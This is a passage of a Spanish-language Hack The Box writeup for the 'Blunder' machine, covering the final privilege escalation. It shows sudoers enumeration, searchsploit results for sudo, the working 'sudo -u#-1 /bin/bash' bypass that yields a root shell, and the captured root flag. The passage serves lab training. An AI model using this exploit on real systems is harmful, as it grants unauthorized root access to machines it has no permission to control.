+<p>Enumerando los privilegios a nivel de <code>sudoers</code>, vemos que el usario <code>hugo</code>, puede ejecutar una bash como cualquier usuario a exepción de root. Aprovechando esto podemos migrar al usuario <code>shaun</code>.</p>
+
+<pre><code class="language-bash">hugo@blunder:~$ sudo -u shaun bash
+shaun@blunder:/home/hugo$ whoami
+shaun
+shaun@blunder:/home/hugo$ id
+uid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)
+</code></pre>
+
+<p>Vemos que el usuario <code>shaun</code>,se encuntra en el grupo <code>lxd</code>, asi que podriamos aprovecharnos de eso para convertirnos en <code>root</code>, pero en esta ocasión vamos a realizarlo de otra manera ya que si vemos la version de sudo que se esta empleando corresponde a una vulnerable.</p>
+
+<pre><code class="language-bash">shaun@blunder:/home/hugo$ sudo --version
+Sudo version 1.8.25p1
+Sudoers policy plugin version 1.8.25p1
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.25p1
+</code></pre>
+
+<p>Buscando un exploit publico encontramos uno referente a <code>security bypass</code> y para versiones menores a la 1.8.27, al ser esta una versión menor podemos usar este exploit.</p>
+
+<pre><code class="language-bash">❯ searchsploit sudo 1.8.
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+sudo 1.8.0 &lt; 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation                                                               | linux/local/25134.c
+sudo 1.8.0 &lt; 1.8.3p1 - Format String                                                                                                                 | linux/dos/18436.txt
+Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation                                                                     | linux/local/37710.txt
+Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                                                                                     | linux/local/42183.c
+Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                                                                                          | linux/local/48052.sh
+Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                                                                                    | linux/dos/47995.txt
+sudo 1.8.27 - Security Bypass                                                                                                                        | linux/local/47502.py
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</code></pre>
+
+<p>Revisamos el codigo del exploit y vemos que solo tenemos que ejecutar la siguiente instrucción <code>sudo -u#-1 /bin/bash</code>, pero debemos hacerlo como el usuario <code>hugo</code> ya que este tenia el privilegio a nivel de <code>sudoers</code>.</p>
+
+<p>Una vez ya como el ususario <code>root</code> nos dirigimos a su directorio personal y visualizamos la segunda flag <code>root.txt.</code></p>
+
+<pre><code class="language-bash">hugo@blunder:~$ sudo -u#-1 /bin/bash
+root@blunder:/home/hugo# whoami
+root
+root@blunder:/home/hugo# cd /root
+root@blunder:/root# cat root.txt 
+dd6d458838b1d2c778b789eeb79ab063
+</code></pre>
+
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina Blunder - htb writeup&url=http://localhost:4000/hackthebox/htb-writeup-Blunder" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
